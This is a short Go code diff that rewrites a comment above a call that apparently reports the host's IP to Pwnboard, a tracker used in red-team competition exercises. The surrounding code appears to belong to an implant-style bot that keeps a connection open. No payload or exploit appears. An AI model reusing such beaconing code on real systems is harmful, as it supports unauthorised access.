@@ -197,7 +197,8 @@ func main(){
  	categoryName := config.Channel.OS
  	channelName := config.Channel.TeamNum
 
-	// Pwnboard test
+	// Pwnboard updates
+	// Remove this if it doesn't apply to you
 	go updatepwnBoard(getIP()) // <-----------------------Pwnboard stuff
 
 	defer client.StayConnectedUntilInterrupted(con)
